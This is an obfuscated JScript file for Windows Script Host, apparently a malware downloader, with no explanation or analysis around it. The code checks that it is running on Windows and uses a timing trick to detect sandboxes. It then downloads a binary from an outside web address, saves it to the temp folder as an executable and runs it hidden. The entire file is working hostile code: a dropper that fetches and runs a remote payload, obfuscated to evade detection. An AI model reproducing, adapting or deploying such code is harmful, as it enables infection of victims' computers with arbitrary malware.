var _DJ = false;
var _V = "CreateObject";
var _B = function _Y() {return WScript[_V]("WScript"+".Shell");}(), _JG = 11;
var _H1 = "MSXML2.XMLHTTP";
var _U = 2123213;
var _DV = 0;
function _XS(_D){_B["Run"](_D, _DV, _DV);};
function _Q(){return _H1 + "";};
function _I(_Q0, _SM){_DV = _DV * 1; return _Q0 - _SM;};
function _DP(){return _V;};
/*@cc_on
  @if (@_win32 || @_win64)
    _DJ = true;
  @end
@*/
if (_DJ)
{
var _XQ = "";
function _MJ(){return 22;};
var _HG = 0; var _N = 0;
function _BO()
{
var _C = new this["Date"]();
var _KR = _C["getUTCMilliseconds"]();
WScript["Sleep"](_MJ());
var _C = new this["Date"]();
var _MW = _C["getUTCMilliseconds"]();
WScript["Sleep"](_MJ());
var _C = new this["Date"]();
var _OS = _C["getUTCMilliseconds"]();
var _HG = "_SX";
_HG = _I(_MW, _KR);
var _N = "_ZN";
_N = _I(_OS, _MW);
_XQ = "open";
return _I(_HG, _N);
}
var _J0 = false;
var _PL = false;
for (var _L0 = _DV; _L0 < _MJ() * 1; _L0++){if (_BO() != _DV){
_J0 = true; 
_N = "31" + 11 * _HG + _N; 
_PL = true; 
break;
}}
function _J() {return ((_J0 == true) && (_J0 == _PL)) ? 1 : _DV;};
if (_J0 && _J() && _PL){
function _H() {return _B["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "mmgM5dlljd6.ex" + "e";};
 _P0 = _Q();
 _Y0 = WScript[_V](_P0);
 var _W = 1;
 while (_W){
try {
	if (_W == 1)
	{
		_Y0[_XQ]("GET", "http://mylookalikedoll.com/n2iks", false);
		_Y0["send"]();
		_P = "Sleep";
	}
	WScript[_P](_MJ() + 120); 
	if (_Y0["readystate"] < 2 * 2) continue;
	_W = _DV;
	function _H0(_L) {var _YX = (1, 2, 3, 4, 5, _L); return _YX;};
	_CS = WScript[_DP()]("ADODB.Stream");
	_P0 = _CS;
	_P0[_XQ]();
	_P0["type"] = _H0(1);
	_P0["write"](_Y0["ResponseBody"]);
	_CS["position"] = _H0(_DV);
	_P0["Save" + "ToFile"](_H(), 2);
	_CS["cl"+"ose"]();
	_VD = _H();
	_XS(_VD);
} catch(_I0){};
}
}
}

